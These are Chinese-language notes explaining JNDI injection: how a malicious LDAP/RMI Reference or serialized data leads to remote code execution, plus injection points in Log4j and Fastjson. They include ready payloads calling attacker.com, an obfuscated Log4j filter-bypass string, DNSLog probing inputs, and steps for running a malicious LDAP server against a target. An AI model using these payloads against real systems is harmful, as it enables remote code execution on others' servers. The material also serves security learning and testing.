JNDI

介绍

漏洞：攻击者让恶意的 JNDI 服务（RMI 或 LDAP）返回一个带有 javaCodeBase 属性的 Reference（引用）对象

  • Reference (引用对象)：你可以把它理解为一张“提货单”。当肉鸡访问你的 LDAP 服务时，你的服务不会直接给它一个 Java 对象，而是给它这张提货单。

  • 提货单上的内容

    1. ClassName: “我要找的东西叫 Exploit”。
    2. Factory: “这个东西由 ExploitFactory 这个工厂类负责生产”。
    3. javaCodeBase: “如果你本地找不到这个工厂类，去 http://attacker.com/ 这个地址下载”。

命令执行原理

早期java允许远程连接外部库，就可以直接在LDAP这种服务器里面写恶意文件，让肉鸡执行

后期java修复后，衍生出两种绕过方法
\1. “找本地危险类” (利用 Local ObjectFactory)：
攻击者返回一个 Reference，但把 javaCodeBase 设为 null（因为高版本 JDK 禁止远程下载），然后把 Factory 指定为肉鸡本地自带的某个类（如 Tomcat 的 BeanFactory）。但基本上我们不知道肉鸡有什么类，攻击手段单一且局限
\2. “利用本地反序列化漏洞” (LDAP 返回 Serialized Data)
这是 LDAP 协议的高级玩法。攻击者不返回“提货单”了，而是直接返回一串二进制数据（即 javaSerializedData）。
原理：LDAP 协议允许直接存储 Java 序列化后的对象。当肉鸡通过 JNDI 获取到这串数据时，Java 底层会自动触发 readObject() 进行反序列化。
随后攻击者通过构造一整条复杂的通用库的通用函数（CC链），最终还是导向Runtime.exec

注入手段

JNDI的核心注入点通常是一个接受字符串并传入lookup()的参数

注入位置/形式

其他技术栈文章中记载的，

  • Log4j 场景：${jndi:ldap://attacker.com/Exploit}
  • Fastjson 场景：{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
  • 原生 JNDI 场景：context.lookup(request.getParameter("name"))

最常见的就是 Web 参数、Header 或日志内容。

攻击者直接传参：?id=ldap://attacker.com/Exploit

或者Log4j的框架下

攻击者把自己的用户名设为 ${jndi:ldap://attacker.com/Exploit} Log4j框架自动调用JNDI

注入步骤

这里以主流的LDAP为例

  1. 注入点： 首先你找到了可能处理你输入并传入lookup的点，例如某个传json的POST请求
  2. 开恶意服务： 用JNDIExploit等恶意工具在公网VPS启动LDAP恶意服务端
  3. 注入payload： 向目标发送 ldap://你的VPS:1389/Exploit
  4. 中毒： 肉鸡解析里面的字符串，直接执行或被CC链攻击

怎么获取注入点？

只有盲测和OOB外带

例如Log4j，它是日志记录工具，他会记录一切看起来有用的信息
包括 Header，参数。直接拿jndi套上去就行
例子：X-Forwarded-For: ${jndi:ldap://你的专属前缀.dnslog.cn/a}
绕过一把测：${${lower:${lower:j}}nd${env:AAA:-i}:${lower:l}${lower:d}a${::-p}://attacker.com/a}

例如fastjson，它只处理前后端交互的json数据
看到json顺手测一下
方法 A：报错回显探测
故意发一个格式损坏的 JSON，或者传入一个它无法解析的类型： {"@type":"java.lang.xxx"}
如果服务器配置不当，返回了 500 错误，并且在报错信息（Stack Trace）里包含 com.alibaba.fastjson... 的字眼，直接确认目标使用了 Fastjson。

方法 B：DNSLog 盲打（最稳妥）
利用 Java 自带的 java.net.URL 或 java.net.Inet4Address 类，这两个类在被实例化时，会默认发起一次 DNS 解析。
你把发往后端的 JSON 改成这样：
{"@type":"java.net.Inet4Address","val":"你的专属前缀.dnslog.cn"}
同样，如果 DNSLog 平台收到了请求，说明 Fastjson 反序列化成功执行了。
